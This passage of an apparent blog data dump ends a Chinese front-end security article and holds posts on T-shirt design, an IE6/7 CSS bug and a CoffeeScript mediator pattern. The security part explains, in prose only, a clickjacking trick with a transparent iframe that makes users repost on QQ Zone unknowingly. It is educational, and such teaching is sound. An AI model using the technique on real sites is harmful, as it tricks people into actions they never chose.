\n注意这是一张图片，滚动条是图片的一部分而不是真正的浏览器控件，用户自然会去下拉“滚动条”，因而触发了这个漏洞。\n\n####9.2) 传说中的QQ空间“传染病毒”\n步骤是这样的：                    \n1. A(始作俑者)发布了一条说说：`这个网站很好玩，快来试试吧~ http://xxx.xxx`                     \n2. A的好友们看到了，打开了这个链接，玩了一下后，就关闭了页面                     \n3. 好友们不知道，竟然自己的空间主动转发了这条说说（问题是自己没有点转发呀！）                     \n4. 一传十十传百，越传越广…                     \n\n但真实的情况跟CSRF没一点关系。玄妙在于：`好友们打开链接后干了什么事情？`                     \n这个网站是一个小球在跳来跳去，网站上有一句话：你能点到我吗？                     \n用户看到后，就很想去点击小球，看会发生什么；但点击后，就转发了说说…                     \n\n有人会问，这不是CSRF吗？还真不是。做法却很简单：                     \n“有趣”的网站内嵌了一个iframe，iframe加载的是这条说说的原页面，然后把“转发”按钮刚好放到小球的位置上，再把这iframe的透明度变为0。所以用户点击小球，其实是`点击了iframe中的转发按钮`。真是令人万万没想到。                     \n\n以上。\nEnd. 5.27 by litten.                                           \n","slug":"safety-point-of-view-from-front-end","updated":1409364790000,"excerpt":"<h3 id=\"零、概述\">零、概述</h3>\n<p>提起web前端安全，大家都会想到两个名词：<code>xss</code>和<code>csrf</code>。<br>抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。<br>大概分为以下章节：</p>\n<blockquote>\n<p>盗取无法用js读写的Cookie<br>删不掉的本地存储<br>函数覆写监听上报<br>内存Cookie与硬盘Cookie<br>CSS带来的点击量泄露<br>JSONP回调函数与UTF-7编码<br>过滤与代码混淆<br>心理学与社会工程学                  </p>\n</blockquote>\n<p>资料略多，文章较长，请自备瓜子…<br>","_id":"ds40w0fe0ddaik1s","categories":[],"photos":[],"link":""},{"layout":"post","title":"毕业衫的设计初稿以及设计这件小事","date":1365993360000,"comments":true,"tags":["10f9ur1kcl6zfda3"],"brief":"宁愿失败地做你爱做的事情，也不要成功地做你恨做的事情","content":"<p><img src=\"/assets/blogImg/bys0.jpg\" alt=\"乔治·伯恩斯，美国著名喜剧演员，八十高龄时夺得了奥斯卡奖\">  </p>\n<blockquote>\n<p>“宁愿失败地做你爱做的事情，也不要成功地做你恨做的事情。” （I honestly think it is better to be a failure at something you love than to be a success at something you hate.） —— George Burns</p>\n</blockquote>\n<p>有那么一段时间，我很讨厌去做设计。           </p>\n<p>厌倦了那种明明没有灵感，但第二天又得交稿的焦急。幸好有音乐，书，游戏和电影，试图说服自己，可以在deadline之前从中寻找到灵感。一幅一幅的参考图片从眼前走马而过，哒哒哒的鼠标点击声不绝于耳，时间越晚，我越认定这事情的疯狂和危险。我希望有那么一天，有人能直接把设计图递到我面前，而我将只着手编码的工作。</p>\n<p>直到实习过后，我成为了一名前端。我开始怀念设计了。<br><a id=\"more\"></a><br>事实并不像想象那样的完美。当有人做好了设计，这意味着无论你觉得设计好坏，你都得去接受，去遵从设计的样式。这就好比强迫自己吃一道不一定喜欢的菜，也许好吃，也许恶心，但你还是得吃下去，冷暖自知。抛弃枕头的励志书，忘掉那个万能的“别人家的孩子”，不去考虑如何能成为百万富翁，而是成为自己喜欢的自己，吃到自己钓的鱼，唱自己写的歌，创造自己设计的东西，原来这都是些多么幸福的事情！</p>\n<p>实习的时候有次在海边，Frank问我回校后干点什么，我说，我一定要设计学院09级的毕业衫。是的，失败又怎样呢，不专业又怎样呢，这是我爱做的事情。也许，可以说是小小的梦想，或者说是“小小的蓄谋已久的”梦想。</p>\n<p><img src=\"/assets/blogImg/bys1.jpg\" alt=\"毕业衫方案1\"><br><img src=\"/assets/blogImg/bys2.jpg\" alt=\"毕业衫方案2\"><br><img src=\"/assets/blogImg/bys3.jpg\" alt=\"毕业衫方案3\"> </p>\n<p>（设计的那3天时间比较赶，只能完成了初稿。细心可以发现，第三个方案有很多细节处理不妥，另外背面的设计也没花过多时间去思考。一定督促自己去完善~）</p>\n","source":"_posts/graduation-shirt-design.markdown","raw":"---\nlayout: post\ntitle: \"毕业衫的设计初稿以及设计这件小事\"\ndate: 2013-04-15 10:36\ncomments: true\ntags: \n\t- 设计\nbrief: \"宁愿失败地做你爱做的事情，也不要成功地做你恨做的事情\"\n---       \n![乔治·伯恩斯，美国著名喜剧演员，八十高龄时夺得了奥斯卡奖](/assets/blogImg/bys0.jpg)  \n> “宁愿失败地做你爱做的事情，也不要成功地做你恨做的事情。” （I honestly think it is better to be a failure at something you love than to be a success at something you hate.） —— George Burns\n\n有那么一段时间，我很讨厌去做设计。           \n\n厌倦了那种明明没有灵感，但第二天又得交稿的焦急。幸好有音乐，书，游戏和电影，试图说服自己，可以在deadline之前从中寻找到灵感。一幅一幅的参考图片从眼前走马而过，哒哒哒的鼠标点击声不绝于耳，时间越晚，我越认定这事情的疯狂和危险。我希望有那么一天，有人能直接把设计图递到我面前，而我将只着手编码的工作。\n\n直到实习过后，我成为了一名前端。我开始怀念设计了。\n<!-- more -->\n事实并不像想象那样的完美。当有人做好了设计，这意味着无论你觉得设计好坏，你都得去接受，去遵从设计的样式。这就好比强迫自己吃一道不一定喜欢的菜，也许好吃，也许恶心，但你还是得吃下去，冷暖自知。抛弃枕头的励志书，忘掉那个万能的“别人家的孩子”，不去考虑如何能成为百万富翁，而是成为自己喜欢的自己，吃到自己钓的鱼，唱自己写的歌，创造自己设计的东西，原来这都是些多么幸福的事情！\n\n实习的时候有次在海边，Frank问我回校后干点什么，我说，我一定要设计学院09级的毕业衫。是的，失败又怎样呢，不专业又怎样呢，这是我爱做的事情。也许，可以说是小小的梦想，或者说是“小小的蓄谋已久的”梦想。\n\n![毕业衫方案1](/assets/blogImg/bys1.jpg) \n![毕业衫方案2](/assets/blogImg/bys2.jpg) \n![毕业衫方案3](/assets/blogImg/bys3.jpg) \n\n（设计的那3天时间比较赶，只能完成了初稿。细心可以发现，第三个方案有很多细节处理不妥，另外背面的设计也没花过多时间去思考。一定督促自己去完善~）\n","slug":"graduation-shirt-design","updated":1409147587000,"excerpt":"<p><img src=\"/assets/blogImg/bys0.jpg\" alt=\"乔治·伯恩斯，美国著名喜剧演员，八十高龄时夺得了奥斯卡奖\">  </p>\n<blockquote>\n<p>“宁愿失败地做你爱做的事情，也不要成功地做你恨做的事情。” （I honestly think it is better to be a failure at something you love than to be a success at something you hate.） —— George Burns</p>\n</blockquote>\n<p>有那么一段时间，我很讨厌去做设计。           </p>\n<p>厌倦了那种明明没有灵感，但第二天又得交稿的焦急。幸好有音乐，书，游戏和电影，试图说服自己，可以在deadline之前从中寻找到灵感。一幅一幅的参考图片从眼前走马而过，哒哒哒的鼠标点击声不绝于耳，时间越晚，我越认定这事情的疯狂和危险。我希望有那么一天，有人能直接把设计图递到我面前，而我将只着手编码的工作。</p>\n<p>直到实习过后，我成为了一名前端。我开始怀念设计了。<br>","_id":"k1v2oh466l4azfkp","categories":[],"photos":[],"link":""},{"layout":"post","title":"分享一个IE6，7的CSS hack bug","date":1355744580000,"comments":true,"tags":["onq1addfunnbgl8n"],"key":"5","content":"<h3 id=\"一、分享一个IE6，7的css_hack_bug。\">一、分享一个IE6，7的css hack bug。</h3>\n<p><img src=\"/assets/blogImg/css_hack.jpg\" alt=\"css hack\">   </p>\n<blockquote>\n<p>IE和我们之间，肯定有一个是傻逼，如果它不是，那我们准是。不然很多事情没法解释…  ——多么痛的领悟 </p>\n</blockquote>\n<p><a id=\"more\"></a><br>先看代码，或者点击看<a href=\"/assets/demo/hack_demo.html\">demo</a><br>html:     </p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">div</span> <span class=\"attribute\">id</span>=<span class=\"value\">\"main\"</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">div</span> <span class=\"attribute\">class</span>=<span class=\"value\">\"box\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div><div class=\"line\">　　<span class=\"tag\">&lt;<span class=\"title\">div</span> <span class=\"attribute\">class</span>=<span class=\"value\">\"box\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">div</span>&gt;</span></div></pre></td></tr></table></figure>\n\n<p>css:     </p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"id\">#main</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">200px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">height</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">border</span>:<span class=\"value\"> <span class=\"number\">1px</span> solid <span class=\"hexcolor\">#000</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin</span>:<span class=\"value\"> <span class=\"number\">0</span> auto</span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#main</span> <span class=\"class\">.box</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">width</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">height</span>:<span class=\"value\"> <span class=\"number\">50px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">margin-left</span>:<span class=\"value\"> <span class=\"number\">10px</span></span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">position</span>:<span class=\"value\"> relative</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">float</span>:<span class=\"value\"> left</span></span>;</div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">background</span>:<span class=\"value\"> <span class=\"hexcolor\">#333</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div><div class=\"line\"><span class=\"id\">#main</span> <span class=\"class\">.box</span><span class=\"pseudo\">:hover</span><span class=\"rules\">{</span></div><div class=\"line\">　　<span class=\"rule\"><span class=\"attribute\">z-index</span>:<span class=\"value\"> <span class=\"number\">999</span></span></span>;</div><div class=\"line\">　　<span class=\"comment\">/*background: #333;*/</span></div><div class=\"line\">　　<span class=\"comment\">/*background: #999;*/</span></div><div class=\"line\"><span class=\"rule\">}</span></div></pre></td></tr></table></figure>\n\n<p>.box设置了的四行核心代码是：          </p>\n<ul>\n<li><code>float:left</code> - 左浮动         </li>\n<li><code>margin-left: 10px</code> - 左外边距为10px            </li>\n<li><code>position: relative</code> - 因为在box里面想用一个dom做绝对定位            </li>\n<li><code>background: #333</code> - 设置background颜色为#333<br>当.box触发hover时，做了一步z-index的改变，这时候在IE6，7中出现bug：因margin-left失效，.box会向左移动10px；而且这时候设置margin-left是不起作用的，hover结束后.box也不会回到原来的位置。</li>\n</ul>\n<h3 id=\"二、淡定解决异次元的bug\">二、淡定解决异次元的bug</h3>\n<p>诡异的事情最后水落石出：<strong>background属性居然影响了margin</strong>。</p>\n<p>将.box:hover多加一行background属性，比如：<code>background: #999</code>，这样子在IE上“看上去”就解决了。<br><strong>但是</strong>，就当你以为解决了bug的时候，如果.box:hover的background颜色设置与hover之前的颜色一样，也就是设置为<code>background: #333</code>，阴魂不散的bug又会重新出现啦。</p>\n<p>庆幸你的需求是background颜色不一样吧。如果还真是悲剧到要做成一样的颜色，解决的办法恐怕只能是取消.box的<code>position: relative</code>，然后多加一层dom容器了。</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;div class=\"box\"&gt;</div><div class=\"line\">　　&lt;div style=\"position: relative\"&gt;…&lt;/div&gt;</div><div class=\"line\">　　…</div><div class=\"line\">&lt;/div&gt;</div></pre></td></tr></table></figure>\n\n<p>友情link：<a href=\"http://xueran.github.com/blog/2012/12/17/csstest-jiugongge/\" target=\"_blank\" rel=\"external\">xueran的这篇文字</a>。</p>\n","source":"_posts/share-a-css-hack.markdown","raw":"---\nlayout: post\ntitle: \"分享一个IE6，7的CSS hack bug\"\ndate: 2012-12-17 19:43\ncomments: true\ntags: \n\t- css\nkey: \"5\"\n---\n###一、分享一个IE6，7的css hack bug。    \n![css hack](/assets/blogImg/css_hack.jpg)   \n> IE和我们之间，肯定有一个是傻逼，如果它不是，那我们准是。不然很多事情没法解释…  ——多么痛的领悟 \n\n<!-- more -->\n先看代码，或者点击看[demo](/assets/demo/hack_demo.html)         \nhtml:     \n```html\n\t<div id=\"main\">\n\t\t<div class=\"box\"></div>\n\t\t<div class=\"box\"></div>\n\t</div> \n```\ncss:     \n```css    \n\t#main{\n\t\twidth: 200px;\n\t\theight: 50px;\n\t\tborder: 1px solid #000;\n\t\tmargin: 0 auto;\n\t}\n\t#main .box{\n\t\twidth: 50px;\n\t\theight: 50px;\n\t\tmargin-left: 10px;\n\t\tposition: relative;\n\t\tfloat: left;\n\t\tbackground: #333;\n\t}\n\t#main .box:hover{\n\t\tz-index: 999;\n\t\t/*background: #333;*/\n\t\t/*background: #999;*/\n\t}\n```\n.box设置了的四行核心代码是：          \n* <code>float:left</code> - 左浮动         \n* <code>margin-left: 10px</code> - 左外边距为10px            \n* <code>position: relative</code> - 因为在box里面想用一个dom做绝对定位            \n* <code>background: #333</code> - 设置background颜色为#333         \n当.box触发hover时，做了一步z-index的改变，这时候在IE6，7中出现bug：因margin-left失效，.box会向左移动10px；而且这时候设置margin-left是不起作用的，hover结束后.box也不会回到原来的位置。\n\n###二、淡定解决异次元的bug\n\n诡异的事情最后水落石出：**background属性居然影响了margin**。\n\n将.box:hover多加一行background属性，比如：<code>background: #999</code>，这样子在IE上“看上去”就解决了。    \n**但是**，就当你以为解决了bug的时候，如果.box:hover的background颜色设置与hover之前的颜色一样，也就是设置为<code>background: #333</code>，阴魂不散的bug又会重新出现啦。\n\n庆幸你的需求是background颜色不一样吧。如果还真是悲剧到要做成一样的颜色，解决的办法恐怕只能是取消.box的<code>position: relative</code>，然后多加一层dom容器了。\n```css\n\t<div class=\"box\">\n\t\t<div style=\"position: relative\">…</div>\n\t\t…\n\t</div>\n```\n\n友情link：[xueran的这篇文字](http://xueran.github.com/blog/2012/12/17/csstest-jiugongge/)。","slug":"share-a-css-hack","updated":1409149912000,"excerpt":"<h3 id=\"一、分享一个IE6，7的css_hack_bug。\">一、分享一个IE6，7的css hack bug。</h3>\n<p><img src=\"/assets/blogImg/css_hack.jpg\" alt=\"css hack\">   </p>\n<blockquote>\n<p>IE和我们之间，肯定有一个是傻逼，如果它不是，那我们准是。不然很多事情没法解释…  ——多么痛的领悟 </p>\n</blockquote>\n<p>","_id":"o9z1n1le3guof396","categories":[],"photos":[],"link":""},{"layout":"post","title":"模式应用小分享——中介者模式(mediator)","date":1357101360000,"comments":true,"tags":["do9xtt4v8s887wdy","81g4urrtts7hilv1"],"content":"<p><img src=\"/assets/blogImg/mediator1.jpg\" alt=\"实况足球\">   </p>\n<blockquote>\n<p>你需要一种设计模式，一定是哪里出问题了。这问题是指语言天生缺陷，不得不去寻找一种通用的解决方案。</p>\n</blockquote>\n<p>程序设计最后的终点，就是要找到一种解决方案来解决问题。这句话正确无疑。但我又想起有个冷笑话，A对B说：我教你怎么去赢这盘象棋，B问怎样，A回答说：吃掉对方的“帅”就赢了啊。略去中间的过程，直接描述到结果，这其实是毫无意义的。而设计模式，又恰恰关乎中间解决问题的过程。<br><a id=\"more\"></a><br>现在关于模式的文章与书籍层出不穷，我自己也在看。但当我将理论回归应用的时候，一下子就懵了。这么多的模式，就像是一张又一张的棋谱教学，它告诉你要这么那么做，但你很少知道如何对症下药。也许到最后你东拼西凑总可以把“帅”吃掉，但遇到一个问题，如何选择下一步的模式见招拆招，已达到最有效率的胜利呢？</p>\n<p>因此我想写一些模式在应用方面的小分享。</p>\n<h2 id=\"中介者，你想到了什么？\"><strong>中介者，你想到了什么？</strong></h2>\n<p>我们可以从实况足球谈起。一场足球比赛，进球加分，犯规处罚，控制时间，这些事件都由一个人来处决，我们叫他裁判，其实他就是比赛的中介者。裁判童鞋，代表了一种<strong>“控制集中化”</strong>的理念，这就是中介者模式的关键。试想一下，我们平时打球一般没有裁判，比分多少，是否犯规等都是由运动员我们自己来记录的，而我们往往都会有记错比分或者犯规纠纷的经验吧。这反应到程序上，就可以说是交互的复杂性带来的混乱。因此，我们在正规的比赛中必须要有裁判，运动员才可以把全部精力放到比赛上面去。于是中介者的引入，把运动员自己的复杂性变成了中介者的复杂性。</p>\n<p>再深入一点，为什么有了裁判后，运动员的精力可以更集中呢？原因很简单，我们不需要记对方的分数了，犯规了也用不着自己去跟对方辩论。也就是说，两个队伍之间完全不用有比赛信息的直接交流了，取而代之的是把自己的信息转交给了裁判，让裁判去衡量两个队伍的信息，再进行加分，去判定是否犯规。这时我们可以说，这两个队伍对象解耦了，队伍对象之间的解耦，在客户端程序设计上的效果是很显著的，你很容易再引入一个队伍对象进行管理。试想一下如果有一场奇怪的球赛是有三个，四个队伍一起进行的，有了裁判这个中介者，运动员还是可以集中精力去比赛，否则他们就要去再多记比分了。</p>\n<h2 id=\"一个例子\"><strong>一个例子</strong></h2>\n<p><iframe id=\"demoIframe\" src=\"/assets/demo/mediator/demo.html\" width=\"500\" height=\"314\" scrolling=\"no\"></iframe><br>或者点这里弹出看<a href=\"/assets/demo/mediator/demo.html\">demo</a><br>三国无双游戏中，有个经典的桥段，大家称为“拼刀”。当两个武将触发拼刀时，武将用武器相互抵着，玩家需要疯狂的按攻击键，一定时间内，谁按的次数多，谁就能赢得拼刀的胜利。其实这就是一个中介者模式的好例子。</p>\n<p>其实不止是像这种“比赛”，想想像电力公司，将各家的电力进行集中管理，像给大家批阅试卷，给出成绩的老师，像一下子可以灭所有灯的寝室楼阿姨，像中国人民代表大会…额好吧，总之就是这么回事。</p>\n<h2 id=\"demo代码解析_coffeescript实现（50行）\"><strong>demo代码解析 coffeescript实现（50行）</strong></h2>\n<p>首先我们设定<code>Player</code>对象，它有points和name属性，同时有一个prototype的属性play，使自己的分数加以，并将这信息通知中介者mediator：</p>\n<figure class=\"highlight coffeescript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"title\">Player</span> = <span class=\"params\">(name)</span>-&gt;</span></div><div class=\"line\">　　<span class=\"property\">@points</span> = <span class=\"number\">0</span></div><div class=\"line\">　　<span class=\"property\">@name</span> = name</div><div class=\"line\"></div><div class=\"line\"><span class=\"attribute\">Player</span>::<span class=\"function\"><span class=\"title\">play</span> = -&gt;</span></div><div class=\"line\">　　<span class=\"property\">@points</span>++</div><div class=\"line\">　　mediator.played()</div></pre></td></tr></table></figure>\n\n<p>然后我们设定<code>scoreboard</code>对象，这是一个得分板，在MVC模式当中，充当了V(view)，视图。它的使命就是update，将传递给它的数据score展示出来。因为裁判是mediator，它判定队伍得分后(得到score)，他必须通知电视台(对应scoreboard)，让他们把分数展示出来：</p>\n<figure class=\"highlight coffeescript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\">scoreboard = </div><div class=\"line\">　　<span class=\"attribute\">element</span>:</div><div class=\"line\">　　　　<span class=\"built_in\">document</span>.getElementById <span class=\"string\">\"results\"</span></div><div class=\"line\">　　<span class=\"attribute\">update</span>:<span class=\"function\"><span class=\"params\">(score)</span>-&gt;</span></div><div class=\"line\">　　　　msg = <span class=\"string\">''</span></div><div class=\"line\">　　　　<span class=\"keyword\">for</span> key,value <span class=\"keyword\">of</span> score </div><div class=\"line\">　　　　　　<span class=\"keyword\">if</span> score.hasOwnProperty key</div><div class=\"line\">　　　　　　　　msg = msg+<span class=\"string\">\"&lt;span&gt;&lt;strong&gt;<span class=\"subst\">#{key}</span>&lt;/strong&gt;:<span class=\"subst\">#{value}</span>&lt;/span&gt;\"</span></div><div class=\"line\">　　　　<span class=\"property\">@element</span>.innerHTML = msg</div><div class=\"line\">　　　　diff = score.Home - score.Guest</div><div class=\"line\">　　　　<span class=\"keyword\">if</span> diff &gt; <span class=\"number\">15</span> </div><div class=\"line\">　　　　　　alert <span class=\"string\">\"Home Win!\"</span></div><div class=\"line\">　　　　　　location.reload();</div><div class=\"line\">　　　　<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> diff &lt;-<span class=\"number\">15</span></div><div class=\"line\">　　　　　　alert <span class=\"string\">\"Guest Win!\"</span></div><div class=\"line\">　　　　　　location.reload();</div><div class=\"line\">　　　　<span class=\"keyword\">else</span></div><div class=\"line\">　　　　　　<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'barGuest'</span>).style.width = <span class=\"number\">150</span> + (diff*<span class=\"number\">10</span>) + <span class=\"string\">'px'</span></div></pre></td></tr></table></figure>\n\n<p>最后的片段就是中介者，<code>mediator</code>。它首先要决定开始比赛，也就是setup，新建了一个名称为Home，一个名称为Guest的Player model。当两个player得分时，mediator执行played，收集两方的分数，构造成score对象，并将这score对象交由scoreboard展示。keypress则是用于判断怎样才算得分：</p>\n<figure class=\"highlight coffeescript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">mediator = </div><div class=\"line\">　　<span class=\"attribute\">players</span>:{}</div><div class=\"line\">　　<span class=\"attribute\">setup</span>:<span class=\"function\">-&gt;</span></div><div class=\"line\">　　　　players = <span class=\"property\">@players</span></div><div class=\"line\">　　　　players.home = <span class=\"keyword\">new</span> Player <span class=\"string\">'Home'</span></div><div class=\"line\">　　　　players.guest = <span class=\"keyword\">new</span> Player <span class=\"string\">'Guest'</span></div><div class=\"line\">　　<span class=\"attribute\">played</span>:<span class=\"function\">-&gt;</span></div><div class=\"line\">　　　　players = <span class=\"property\">@players</span></div><div class=\"line\">　　　　score = </div><div class=\"line\">　　　　　　<span class=\"attribute\">Home</span>: players.home.points</div><div class=\"line\">　　　　　　<span class=\"attribute\">Guest</span>:players.guest.points</div><div class=\"line\">　　　　scoreboard.update score</div><div class=\"line\">　　<span class=\"attribute\">keypress</span>:<span class=\"function\"><span class=\"params\">(e)</span>-&gt;</span></div><div class=\"line\">　　　　e = e|| <span class=\"built_in\">window</span>.event</div><div class=\"line\">　　　　keycode = e.which</div><div class=\"line\">　　　　<span class=\"keyword\">if</span> keycode <span class=\"keyword\">is</span> <span class=\"number\">102</span></div><div class=\"line\">　　　　　　mediator.players.home.play()</div><div class=\"line\">　　　　　　<span class=\"keyword\">return</span></div><div class=\"line\">　　　　<span class=\"keyword\">if</span> keycode <span class=\"keyword\">is</span> <span class=\"number\">106</span></div><div class=\"line\">　　　　　　mediator.players.guest.play()</div><div class=\"line\">　　　　　　<span class=\"keyword\">return</span></div></pre></td></tr></table></figure>\n\n<p>最后执行，运行程序：</p>\n<figure class=\"highlight coffeescript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">mediator.setup()</div><div class=\"line\"><span class=\"built_in\">window</span>.onkeypress = mediator.keypress</div></pre></td></tr></table></figure>\n\n<h2 id=\"小分享心得\"><strong>小分享心得</strong></h2>\n<p>中介者模式将控制集中化，colleague对象之间解耦，不必维护各自之间的网状通信，但mediator承受了所有colleague提供过来的信息，肯定会相对复杂。如何优化mediator也会成为一个课题。中介者模式有点像一对多的模型，一个mediator对应多个colleague，而如果现实模型是多对多的，中介者模型视复杂度来说不一定适合。</p>\n","source":"_posts/mediator-model.markdown","raw":"---\nlayout: post\ntitle: \"模式应用小分享——中介者模式(mediator)\"\ndate: 2013-01-02 12:36\ncomments: true\ntags: \n\t- coffeescript \n\t- 模式\n---   \n![实况足球](/assets/blogImg/mediator1.jpg)   \n> 你需要一种设计模式，一定是哪里出问题了。这问题是指语言天生缺陷，不得不去寻找一种通用的解决方案。\n\n程序设计最后的终点，就是要找到一种解决方案来解决问题。这句话正确无疑。但我又想起有个冷笑话，A对B说：我教你怎么去赢这盘象棋，B问怎样，A回答说：吃掉对方的“帅”就赢了啊。略去中间的过程，直接描述到结果，这其实是毫无意义的。而设计模式，又恰恰关乎中间解决问题的过程。\n<!-- more -->\n现在关于模式的文章与书籍层出不穷，我自己也在看。但当我将理论回归应用的时候，一下子就懵了。这么多的模式，就像是一张又一张的棋谱教学，它告诉你要这么那么做，但你很少知道如何对症下药。也许到最后你东拼西凑总可以把“帅”吃掉，但遇到一个问题，如何选择下一步的模式见招拆招，已达到最有效率的胜利呢？\n\n因此我想写一些模式在应用方面的小分享。\n\n##**中介者，你想到了什么？**\n我们可以从实况足球谈起。一场足球比赛，进球加分，犯规处罚，控制时间，这些事件都由一个人来处决，我们叫他裁判，其实他就是比赛的中介者。裁判童鞋，代表了一种**“控制集中化”**的理念，这就是中介者模式的关键。试想一下，我们平时打球一般没有裁判，比分多少，是否犯规等都是由运动员我们自己来记录的，而我们往往都会有记错比分或者犯规纠纷的经验吧。这反应到程序上，就可以说是交互的复杂性带来的混乱。因此，我们在正规的比赛中必须要有裁判，运动员才可以把全部精力放到比赛上面去。于是中介者的引入，把运动员自己的复杂性变成了中介者的复杂性。\n\n再深入一点，为什么有了裁判后，运动员的精力可以更集中呢？原因很简单，我们不需要记对方的分数了，犯规了也用不着自己去跟对方辩论。也就是说，两个队伍之间完全不用有比赛信息的直接交流了，取而代之的是把自己的信息转交给了裁判，让裁判去衡量两个队伍的信息，再进行加分，去判定是否犯规。这时我们可以说，这两个队伍对象解耦了，队伍对象之间的解耦，在客户端程序设计上的效果是很显著的，你很容易再引入一个队伍对象进行管理。试想一下如果有一场奇怪的球赛是有三个，四个队伍一起进行的，有了裁判这个中介者，运动员还是可以集中精力去比赛，否则他们就要去再多记比分了。\n\n##**一个例子**\n<iframe id=\"demoIframe\" src=\"/assets/demo/mediator/demo.html\" width=\"500\" height=\"314\" scrolling=\"no\"></iframe>\n或者点这里弹出看[demo](/assets/demo/mediator/demo.html)         \n三国无双游戏中，有个经典的桥段，大家称为“拼刀”。当两个武将触发拼刀时，武将用武器相互抵着，玩家需要疯狂的按攻击键，一定时间内，谁按的次数多，谁就能赢得拼刀的胜利。其实这就是一个中介者模式的好例子。\n\n其实不止是像这种“比赛”，想想像电力公司，将各家的电力进行集中管理，像给大家批阅试卷，给出成绩的老师，像一下子可以灭所有灯的寝室楼阿姨，像中国人民代表大会…额好吧，总之就是这么回事。\n\n##**demo代码解析 coffeescript实现（50行）**\n\n首先我们设定<code>Player</code>对象，它有points和name属性，同时有一个prototype的属性play，使自己的分数加以，并将这信息通知中介者mediator：\n```coffeescript\n\tPlayer = (name)->\n\t\t@points = 0\n\t\t@name = name\n\n\tPlayer::play = ->\n\t\t@points++\n\t\tmediator.played()\n```\n然后我们设定<code>scoreboard</code>对象，这是一个得分板，在MVC模式当中，充当了V(view)，视图。它的使命就是update，将传递给它的数据score展示出来。因为裁判是mediator，它判定队伍得分后(得到score)，他必须通知电视台(对应scoreboard)，让他们把分数展示出来：\n```coffeescript\n\tscoreboard = \n\t\telement:\n\t\t\tdocument.getElementById \"results\"\n\t\tupdate:(score)->\n\t\t\tmsg = ''\n\t\t\tfor key,value of score \n\t\t\t\tif score.hasOwnProperty key\n\t\t\t\t\tmsg = msg+\"<span><strong>#{key}</strong>:#{value}</span>\"\n\t\t\t@element.innerHTML = msg\n\t\t\tdiff = score.Home - score.Guest\n\t\t\tif diff > 15 \n\t\t\t\talert \"Home Win!\"\n\t\t\t\tlocation.reload();\n\t\t\telse if diff <-15\n\t\t\t\talert \"Guest Win!\"\n\t\t\t\tlocation.reload();\n\t\t\telse\n\t\t\t\tdocument.getElementById('barGuest').style.width = 150 + (diff*10) + 'px'\n```\n最后的片段就是中介者，<code>mediator</code>。它首先要决定开始比赛，也就是setup，新建了一个名称为Home，一个名称为Guest的Player 